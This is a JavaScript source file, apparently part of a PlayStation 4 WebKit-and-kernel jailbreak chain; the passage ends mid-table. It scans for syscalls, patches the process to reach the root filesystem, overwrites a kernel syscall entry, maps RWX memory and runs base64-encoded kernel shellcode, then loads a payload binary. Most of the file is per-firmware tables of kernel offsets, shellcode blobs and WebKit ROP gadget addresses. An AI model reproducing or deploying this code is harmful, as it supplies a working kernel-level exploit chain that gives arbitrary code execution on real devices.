const MAIN_CORE = 7;
const syscalls = new Map();

const k_proc_pid = 0xb0;
const k_pipe_sigio = 0xd0;
const k_filedesc_sizeof = 8;
const k_filedesc_fdt_ofiles = 0;
const k_in6p_outputopts = 0x118;
const k_ip6po_rthdr = 0x68;
const k_ip6po_tclass = 0xb0;

function init_syscalls() {
  if (syscalls.size > 0) {
    logger.info(`Already found ${syscalls.size} syscalls !!`);
    return;
  }

  const size = 0x40000;
  const base = libkernel_base;
  const pattern = [0x48, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x49, 0x89, 0xca, 0x0f, 0x05];
  const pattern_end = pattern.length - 1;

  const u8 = new Uint8Array(ArrayBuffer.from(base, size));

  let i = 0;
  let match = 0;
  let offset = 0;
  while (offset < size) {
    const b = u8[offset];
    const c = pattern[i];

    if (b === c || c === 0xff) {
      if (i === 0) {
        match = offset;
      }

      i++;

      if (i === pattern_end) {
        const addr = base.add(match);
        const id = arw.view(addr).getInt32(3, true);

        syscalls.set(id, addr);

        i = 0;
      }
    } else {
      i = 0;
    }

    offset++;
  }

  logger.info(`Found ${syscalls.size} syscalls !!`);
}

function get_syscall(id) {
  if (!syscalls.has(id)) {
    throw new Error(`Unable to find syscall ${id} !!`);
  }

  return syscalls.get(id);
}

async function exploit() {
  if (version.major < 12 || (version.major === 12 && version.minor <= 2)) {
    await load_script('src/lapse.js');
  } else {
    throw new Error(`${version} exploit is WIP`);
    //await load_script('src/lapse.js');
  }

  await exploit_main();
}

function make_pipe() {
  const pair_addr = mem.alloc(8);

  if (!fn.hasOwnProperty('pipe')) {
    fn.pipe = new NativeFunction(0x2a, 'number');
  }

  if (fn.pipe.invoke(pair_addr) === -1) {
    throw new SyscallError('Unable to create pipe !!');
  }

  const rp = arw.view(pair_addr).getInt32(0, true);
  const wp = arw.view(pair_addr).getInt32(4, true);

  mem.free(pair_addr);

  return [rp, wp];
}

function patch_proc(p, kp) {
  const p_fd = kview(p).getBInt(0x48, true);
  const kp_fd = kview(kp).getBInt(0x48, true);

  // Allow root file system access
  const root_vnode = kview(kp_fd).getBInt(0x10, true);

  kview(p_fd).setBInt(0x10, root_vnode, true); // fd_rdir
  kview(p_fd).setBInt(0x18, root_vnode, true); // fd_jdir
}

async function post_jailbreak() {
  const sysent_661_addr = kernel_base.add(impl.k_sysent_661);
  logger.debug(`sysent_661_addr: ${sysent_661_addr}`);

  const jmp_qword_ptr_rsi_addr = kernel_base.add(impl.k_jmp_qword_ptr_rsi);
  logger.debug(`jmp_qword_ptr_rsi_addr: ${jmp_qword_ptr_rsi_addr}`);

  const sy_narg = kview(sysent_661_addr).getUint32(0, true);
  const sy_call = kview(sysent_661_addr).getBInt(8, true);
  const sy_thrcnt = kview(sysent_661_addr).getUint32(0x2c, true);

  logger.debug(`sy_narg: ${sy_narg}`);
  logger.debug(`sy_call: ${sy_call}`);
  logger.debug(`sy_thrcnt: ${sy_thrcnt}`);

  kview(sysent_661_addr).setUint32(0, 2, true);
  kview(sysent_661_addr).setBInt(8, jmp_qword_ptr_rsi_addr, true);
  kview(sysent_661_addr).setUint32(0x2c, 1, true);

  const shellcode_u8 = Uint8Array.from(atob(impl.k_shellcode), (c) => c.charCodeAt(0));

  const size = shellcode_u8.length.alignUp(PAGE_SIZE);
  const prot = PROT_READ | PROT_WRITE | PROT_EXEC;
  const flags = MAP_SHARED | MAP_FIXED;

  const exec_fd = fn.jitshm_create.invoke(0, size, prot);
  logger.debug(`exec_fd: ${exec_fd}`);
  if (exec_fd === -1) {
    throw new SyscallError('Unablet to create JIT shared memory with rwx !!');
  }

  const mapping_addr = new BInt('0x920100000');

  if (fn.mmap.invoke(mapping_addr, size, prot, flags, exec_fd, 0).eq(-1)) {
    throw new SyscallError(`Unable to map memory with size ${size} with rwx !!`);
  }

  mem.copy(mapping_addr, shellcode_u8.buffer.data(), shellcode_u8.length);

  const ret = fn.kexec.invoke(mapping_addr);
  logger.debug(`kexec_ret: ${ret}`);
  if (ret === -1) {
    throw new SyscallError(`Unable to kexec ${mapping_addr} !!`);
  }

  kview(sysent_661_addr).setUint32(0, sy_narg, true);
  kview(sysent_661_addr).setBInt(8, sy_call, true);
  kview(sysent_661_addr).setUint32(0x2c, sy_thrcnt, true);

  await load_bin();
}

async function load_bin() {
  const bin_u8 = await load_file('src/ps4/payload.bin');

  const size = bin_u8.length.alignUp(PAGE_SIZE);
  const prot = PROT_READ | PROT_WRITE | PROT_EXEC;
  const flags = MAP_PRIVATE | MAP_ANONYMOUS;

  const entry_addr = fn.mmap.invoke(0, size, prot, flags, -1, 0);
  logger.debug(`entry_addr: ${entry_addr}`);
  if (entry_addr.eq(-1)) {
    throw new SyscallError(`Unable to map memory with size ${size} !!`);
  }

  mem.copy(entry_addr, bin_u8.buffer.data(), bin_u8.length);

  const pthread_addr_addr = mem.alloc(8);

  if (fn.pthread_create.invoke(pthread_addr_addr, 0, entry_addr, 0)) {
    throw new Error('Unable to create bin thread !!');
  }

  const pthread_addr = arw.view(pthread_addr_addr).getBInt(0, true);
  const pthread_id = arw.view(pthread_addr).getBInt(0, true);

  logger.info(`Created bin thread with id ${pthread_id} !!`);

  const ret_addr = mem.alloc(8);

  if (fn.pthread_join.invoke(pthread_addr, ret_addr)) {
    throw new Error(`Unable to join thread ${pthread_id} !!`);
  }

  const ret = arw.view(ret_addr).getInt32(0, true);

  logger.info(`bin returned ${ret} !!`);

  mem.free(pthread_addr_addr);
}

const impl_map = {
  9: {
    0: {
      k_sysent_661: 0x1107f00,
      k_evf_cv_desc: 0x7f6f27,
      k_jmp_qword_ptr_rsi: 0x4c7ad,
      k___stack_chk_guard: 0x274c010,

      k_shellcode:
        'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcLtxQQAZomBdGhiAMaBzQoAAOvGgf0TJwDrxoFBFCcA68aBvRQnAOvGgQEVJwDrxoGtFicA68aBXRsnAOvGgS0cJwDrZomxX3FiAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoEGGgAA62ZEiYmLCwgAZkSJkcSuIwDGgX+2IwDrx4FAGyIASDHAw8aBKmMWADfGgS1jFgA3x4EgBRABAgAAAEiJkSgFEAHHgUwFEAEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBQ1pBAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgUtaQQC4BAAAAEG5SYv//2aJgV1aQQC4BAAAAGaJgWpaQQC4BQAAAGaJgYJaQQC4BQAAAGZEiZkBWkEAx4FZWkEASYuH0MaBX1pBAADHgWZaQQBJi7ewxoFsWkEAAMeBflpBAEmLh0DGgYRaQQAAx4GLWkEASYu3IGaJgY9aQQDGgZFaQQAAx4GjWkEASY2/wGaJkadaQQDGgalaQQAAx4GvWkEASY2/4GaJsbNaQQDGgbVaQQAAx4HCWkEASY2/AGaJucZaQQDGgchaQQAAx4HOWkEASY2/IGZEiYHSWkEAxoHUWkEAAGZEiYnfWkEAxoHhWkEA/w8gwEgNAAABAA8iwDHAww==',

      lk__error: 0xcb80,
      lc_strerror: 0x394f0,

      wk_pthread_create: 0x4648,
      wk_pthread_join: 0x4678,
      wk_expm1_builtin: 0x1d23560,
      wk___imp___error: 0x2f4a4d0,
      wk___imp_strerror: 0x2f4a520,
      wk_TypedArray_m_mode: 0x1c,
      wk_JSFunction_m_function: 0x28,
      wk_ArrayBuffer_m_contents_m_data: 0x10,
      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x24,
      wk_JSGlobalObject_m_vm_topEntryFrame: 0x9ee0,

      get wk_RET() {
        return webkit_base.add(0x32);
      },
      get wk_LEAVE_RET() {
        return webkit_base.add(0x8db5b);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x1a7ef1);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x422571);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x620df9);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x85ec71);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x1da461);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x1f4d5);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x31968f);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x51a12);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0xbe5d0);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x657b7);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x986c);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x319690);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x1f4d6);
      },
      get wk_POP_RBP_RET() {
        return webkit_base.add(0xb6);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x4e293);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x613b);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x22be90);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x2236a71);
      },
      make_fake_container(jscell) {
        const container = {
          jscell: jscell, // NaN-boxed, fix later
          butterfly: null, // becomes 0x2, fix later
          vector: arw.victim,
          length_and_mode: true, // becomes 0x7, fix later
        };

        delete container.butterfly; // becomes 0

        return container;
      },
      make_master(victim_addr) {
        arw.victim.setBInt(0x10, victim_addr, true);
        arw.victim.setUint32(impl.wk_TypedArray_m_mode, 1, true); // TypedArrayMode:OversizeTypedArray
      },
      fix_victim() {
        const victim_addr = arw.addrof(arw.victim);
        logger.debug(`victim_addr: ${victim_addr}`);

        arw.view(victim_addr).setInt32(0x18, -1, true);
      },
      ab_fake(ab, addr, len) {
        const ab_addr = arw.addrof(ab);
        const m_impl = arw.view(ab_addr).getBInt(0x10, true);
        const m_data = arw.view(m_impl).getBInt(0x10, true);

        ab.m_data = m_data;

        arw.view(m_impl).setBInt(0, 2, true); // DeferrableRefCountedBase::m_refCount
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_data, addr, true);
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_sizeInBytes, len, true);
      },
      ab_free(ab) {
        const ab_addr = arw.addrof(ab);
        const m_impl = arw.view(ab_addr).getBInt(0x10, true);

        arw.view(m_impl).setBInt(0, 0, true); // DeferrableRefCountedBase::m_refCount
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_data, ab.m_data, true);
        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_sizeInBytes, 0, true);
      },
      ab_data(ab) {
        const ab_addr = arw.addrof(ab);
        const m_impl = arw.view(ab_addr).getBInt(0x10, true);

        return arw.view(m_impl).getBInt(impl.wk_ArrayBuffer_m_contents_m_data, true);
      },
    },
    3: {
      k_sysent_661: 0x1103f00,
      k_evf_cv_desc: 0x7f4ce7,
      k_jmp_qword_ptr_rsi: 0x5325b,
      k_shellcode:
        'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcKbMAUAZomBNEhiAMaBzQoAAOvGgX0QJwDrxoHBECcA68aBPREnAOvGgYERJwDrxoEtEycA68aB3RcnAOvGga0YJwDrZomxH1FiAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoEGGgAA62ZEiYmLCwgAZkSJkZSrIwDGgU+zIwDrx4EQGCIASDHAw8aB2mIWADfGgd1iFgA3x4EgxQ8BAgAAAEiJkSjFDwHHgUzFDwEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBszlBAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgbs5QQC4BAAAAEG5SYv//2aJgc05QQC4BAAAAGaJgdo5QQC4BQAAAGaJgfI5QQC4BQAAAGZEiZlxOUEAx4HJOUEASYuH0MaBzzlBAADHgdY5QQBJi7ewxoHcOUEAAMeB7jlBAEmLh0DGgfQ5QQAAx4H7OUEASYu3IGaJgf85QQDGgQE6QQAAx4ETOkEASY2/wGaJkRc6QQDGgRk6QQAAx4EfOkEASY2/4GaJsSM6QQDGgSU6QQAAx4EyOkEASY2/AGaJuTY6QQDGgTg6QQAAx4E+OkEASY2/IGZEiYFCOkEAxoFEOkEAAGZEiYlPOkEAxoFROkEA/w8gwEgNAAABAA8iwDHAww==',
    },
    0x50: {
      k_sysent_661: 0x1100ee0,
      k_evf_cv_desc: 0x769a88,
      k_jmp_qword_ptr_rsi: 0x15a6d,
      k_shellcode:
        'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcKtWAEAZomB5EpiAMaBzQoAAOvGgQ0cIADrxoFRHCAA68aBzRwgAOvGgREdIADrxoG9HiAA68aBbSMgAOvGgT0kIADrZomxz1NiAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoE2pR8A62ZEiYk7bRkAZkSJkST3GQDGgd/+GQDrx4FgGQEASDHAw8aBei0SADfGgX0tEgA3x4EAlQ8BAgAAAEiJkQiVDwHHgSyVDwEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBs3cNAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgbt3DQC4BAAAAEG5SYv//2aJgc13DQC4BAAAAGaJgdp3DQC4BQAAAGaJgfJ3DQC4BQAAAGZEiZlxdw0Ax4HJdw0ASYuH0MaBz3cNAADHgdZ3DQBJi7ewxoHcdw0AAMeB7ncNAEmLh0DGgfR3DQAAx4H7dw0ASYu3IGaJgf93DQDGgQF4DQAAx4ETeA0ASY2/wGaJkRd4DQDGgRl4DQAAx4EfeA0ASY2/4GaJsSN4DQDGgSV4DQAAx4EyeA0ASY2/AGaJuTZ4DQDGgTh4DQAAx4E+eA0ASY2/IGZEiYFCeA0AxoFEeA0AAGZEiYlPeA0AxoFReA0A/w8gwEgNAAABAA8iwDHAww==',

      lk__error: 0xbb60,
      lc_strerror: 0x357d0,

      wk_pthread_create: 0x4748,
      wk_pthread_join: 0x4778,
      wk_expm1_builtin: 0xd05b0,
      wk___imp___error: 0x2f91ce0,
      wk___imp_strerror: 0x2f91d00,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x56322);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x3fe32);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0xaaad51);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x520109);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x420ad1);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x18fc4c1);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x28c900);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x1619db);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x11c46);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x13730);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x35a1e);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x18de52);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x5d19d);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x92a8c);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x253e0);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x10c07);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x232f2);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x36f464);
      },
    },
  },
  10: {
    0: {
      k_sysent_661: 0x110a980,
      k_evf_cv_desc: 0x7b5133,
      k_jmp_qword_ptr_rsi: 0x68b1,
      k_shellcode:
        'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wAAAL7rAAAAv+sAAABBuOsAAABBuesEAABBupDp//9IgcLxZgAAZomBZOhhAMaBzQoAAOvGgW0sRwDrxoGxLEcA68aBLS1HAOvGgXEtRwDrxoEdL0cA68aBzTNHAOvGgZ00RwDrZomxT/FhAMeBkAQAAAAAAADGgcIEAADrZom5uQQAAGZEiYG1BAAAxoFWdyYA62ZEiYl7IDkAZkSJkaT6GADGgV8CGQDrx4FA6hsASDHAw8aBmtUOADfGgZ3VDgA3x4GgLxABAgAAAEiJkagvEAHHgcwvEAEBAAAADyDASA0AAAEADyLADyDASCX///7/DyLAuOsGAABBu+tIAAAx0jH2ZomBgzYtAL8BAAAASLhBg7+gBAAAAEG4AQAAAEiJgYs2LQC4BAAAAEG5SYv//2aJgZ02LQC4BAAAAGaJgao2LQC4BQAAAGaJgcI2LQC4BQAAAGZEiZlBNi0Ax4GZNi0ASYuH0MaBnzYtAADHgaY2LQBJi7ewxoGsNi0AAMeBvjYtAEmLh0DGgcQ2LQAAx4HLNi0ASYu3IGaJgc82LQDGgdE2LQAAx4HjNi0ASY2/wGaJkec2LQDGgek2LQAAx4HvNi0ASY2/4GaJsfM2LQDGgfU2LQAAx4ECNy0ASY2/AGaJuQY3LQDGgQg3LQAAx4EONy0ASY2/IGZEiYESNy0AxoEUNy0AAGZEiYkfNy0AxoEhNy0A/w8gwEgNAAABAA8iwDHAww==',

      lk__error: 0x14f40,
      lc_strerror: 0x10d00,

      wk_pthread_create: 0x20c8,
      wk_pthread_join: 0x2108,
      wk_expm1_builtin: 0x218bb70,
      wk___imp___error: 0x36d1bf0,
      wk___imp_strerror: 0x36d1c20,
      wk_TypedArray_m_mode: 0x20,
      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x28,
      wk_JSGlobalObject_m_vm_topEntryFrame: 0x9a70,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x2ca6c3);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0xe881);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x947b91);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x1d83283);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x15a945);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x1a07f2);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x495225);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0xe882);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x4faa1);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x3a6c9);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x1644b2);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x51056);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0xbe86);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x3a4af);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0xc037);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x7a170);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x25ce448);
      },
      make_fake_container(jscell) {
        const container = {
          jscell: jscell, // NaN-boxed, fix later
          butterfly: null, // becomes 0x2, fix later
          vector: arw.victim,
          length: true, // becomes 0x7, fix later
          mode: null, // becomes 0x2, fix later
        };

        delete container.butterfly; // becomes 0
        delete container.mode; // becomes 0

        return container;
      },
      make_master(victim_addr) {
        arw.victim.setBInt(0x10, victim_addr, true);
        arw.victim.setBInt(impl.wk_TypedArray_m_mode, 1, true); // TypedArrayMode:OversizeTypedArray
      },
      fix_victim() {
        const victim_addr = arw.addrof(arw.victim);
        logger.debug(`victim_addr: ${victim_addr}`);

        arw.view(victim_addr).setBInt(0x18, -1, true);
      },
    },
    0x50: {
      k_sysent_661: 0x110a5b0,
      k_evf_cv_desc: 0x7a7b14,
      k_jmp_qword_ptr_rsi: 0x50ded,
      k_shellcode:
        'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYETMCEAuOsEAABBuesAAABBuusAAABmiYHsskcAQbvrAAAAuJDp//9IgcItDAUAZomxIzAhAGaJuUMwIQBmRImBtH1iAMaBzQoAAOvGgb1yDQDrxoEBcw0A68aBfXMNAOvGgcFzDQDrxoFtdQ0A68aBHXoNAOvGge16DQDrZkSJiZ+GYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgcbBCADrZomB1CohAMeBiDAhAJDpPAHHgWCrLQBIMcDDxoEqxBkAN8aBLcQZADfHgdArEAECAAAASImR2CsQAceB/CsQAQEAAAAPIMBIDQAAAQAPIsAxwMM=',

      lk__error: 0x1470,

      wk_pthread_create: 0x20d8,
      wk_pthread_join: 0x2118,
      wk_expm1_builtin: 0x218dcd0,
      wk___imp___error: 0x36d5be8,
      wk___imp_strerror: 0x36d5c18,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x38712);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x2cd91);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x58104d);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x9d6a43);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x66b813);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0xd8b71f);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x14fda5);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x393a35);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x2cd92);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x16af6e);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x1da1c);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x1d9eb);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x5b8a9);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x13b027);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x9512b);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x18b1b);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0xc4260);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x25d0518);
      },
    },
  },
  11: {
    0: {
      k_sysent_661: 0x1109350,
      k_evf_cv_desc: 0x7fc26f,
      k_jmp_qword_ptr_rsi: 0x71a21,
      k_shellcode:
        'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYEzTB4AuOsEAABBuesAAABBuusAAABmiYHsyDUAQbvrAAAAuJDp//9IgcJhGAcAZomxQ0weAGaJuWNMHgBmRImBZD9iAMaBzQoAAOvGgT3dLQDrxoGB3S0A68aB/d0tAOvGgUHeLQDrxoHt3y0A68aBneQtAOvGgW3lLQDrZkSJiU9IYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgSYVQwDrZomB9EYeAMeBqEweAJDpPAHHgeCMCABIMcDDxoFqYhUAN8aBbWIVADfHgXAZEAECAAAASImReBkQAceBnBkQAQEAAAAPIMBIDQAAAQAPIsAxwMM=',

      lk__error: 0x3370,

      wk_pthread_create: 0x2068,
      wk_pthread_join: 0x20a8,
      wk_expm1_builtin: 0x2193f30,
      wk___imp___error: 0x36e1c68,
      wk___imp_strerror: 0x36e1c98,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x31f9d);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0xe53a2);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x6403a1);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x0);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x90d803);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0xab6981);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x249e1);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x4d1f05);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x4e6a9);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0xe16a);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x71617);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x10d11);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x2f7e16);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x249e2);
      },
      get wk_POP_RSP_RET() {
        return webkit_base.add(0x927d1);
      },
      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
        return webkit_base.add(0x97db);
      },
      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
        return webkit_base.add(0x2e5d4b);
      },
      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
        return webkit_base.add(0x25d6988);
      },
    },
    2: {
      k_evf_cv_desc: 0x7fc22f,
      k_shellcode:
        'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYFTTB4AuOsEAABBuesAAABBuusAAABmiYEMyTUAQbvrAAAAuJDp//9IgcJhGAcAZomxY0weAGaJuYNMHgBmRImBBD9iAMaBzQoAAOvGgV3dLQDrxoGh3S0A68aBHd4tAOvGgWHeLQDrxoEN4C0A68aBveQtAOvGgY3lLQDrZkSJie9HYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgbYUQwDrZomBFEceAMeByEweAJDpPAHHgeCMCABIMcDDxoGKYhUAN8aBjWIVADfHgXAZEAECAAAASImReBkQAceBnBkQAQEAAAAPIMBIDQAAAQAPIsAxwMM=',

      wk_expm1_builtin: 0x2193f40,

      get wk_POP_R9_RET() {
        return webkit_base.add(0x6403b1);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x90d813);
      },
    },
    0x50: {
      k_sysent_661: 0x110a760,
      k_evf_cv_desc: 0x784318,
      k_jmp_qword_ptr_rsi: 0x704d5,
      k_shellcode:
        'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYGjdhsAuOsEAABBuesAAABBuusAAABmiYGsvi8AQbvrAAAAuJDp//9IgcIVAwcAZomxs3YbAGaJudN2GwBmRImBtHhiAMaBzQoAAOvGge3SKwDrxoEx0ysA68aBrdMrAOvGgfHTKwDrxoGd1SsA68aBTdorAOvGgR3bKwDrZkSJiZ+BYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgaYSOQDrZomBZHEbAMeBGHcbAJDpPAHHgSDWOwBIMcDDxoE6ph8AN8aBPaYfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYFRVRIAuOsGAAC/BQAAAGaJgZNVEgBBugEAAABIuEGDv6AEAAAAQbsBAAAASImBm1USALgEAAAAZomBrVUSALhJi///x4GpVRIASYuH0MaBr1USAADHgbZVEgBJi7ewZomRulUSAMaBvFUSAADHgc5VEgBJi4dAZomx0lUSAMaB1FUSAADHgdtVEgBJi7cgZom531USAMaB4VUSAADHgfNVEgBJjb/AZkSJgfdVEgDGgflVEgAAx4H/VRIASY2/4GZEiYkDVhIAxoEFVhIAAMeBElYSAEmNvwBmRImRFlYSAMaBGFYSAADHgR5WEgBJjb8gZkSJmSJWEgDGgSRWEgAAZomBL1YSAMaBMVYSAP8PIMBIDQAAAQAPIsAxwMM=',

      lk__error: 0x183c0,
      lc_strerror: 0x10d00,

      wk_pthread_create: 0x2098,
      wk_pthread_join: 0x20d8,
      wk_expm1_builtin: 0x2587bd0,
      wk___imp___error: 0x3cbcc98,
      wk___imp_strerror: 0x3cbccc0,
      wk_TypedArray_m_mode: 0x28,
      wk_TypedArray_m_byteOffset: 0x20,
      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x30,
      wk_ArrayBuffer_m_contents_m_maxByteLength: 0x38,
      wk_JSGlobalObject_m_vm_topEntryFrame: 0x9cf0,

      get wk_LEAVE_RET() {
        return webkit_base.add(0x885eb);
      },
      get wk_POP_R8_RET() {
        return webkit_base.add(0x1acdc3);
      },
      get wk_POP_R9_RET() {
        return webkit_base.add(0x86d67);
      },
      get wk_POP_R10_RET() {
        return webkit_base.add(0x1d09d1b);
      },
      get wk_POP_R11_RET() {
        return webkit_base.add(0x2e3619);
      },
      get wk_POP_R12_RET() {
        return webkit_base.add(0x5cf44f);
      },
      get wk_POP_R13_RET() {
        return webkit_base.add(0x1ef72ba);
      },
      get wk_POP_R14_RET() {
        return webkit_base.add(0x1e254a);
      },
      get wk_POP_R15_RET() {
        return webkit_base.add(0x1ab065);
      },
      get wk_POP_RAX_RET() {
        return webkit_base.add(0x3d012);
      },
      get wk_POP_RBX_RET() {
        return webkit_base.add(0x3d397);
      },
      get wk_POP_RCX_RET() {
        return webkit_base.add(0x3ce7d);
      },
      get wk_POP_RDX_RET() {
        return webkit_base.add(0x101a);
      },
      get wk_POP_RDI_RET() {
        return webkit_base.add(0x8dfd5);
      },
      get wk_POP_RSI_RET() {
        return webkit_base.add(0x8682d);
      },
      get wk_POP_RSP_RET() {
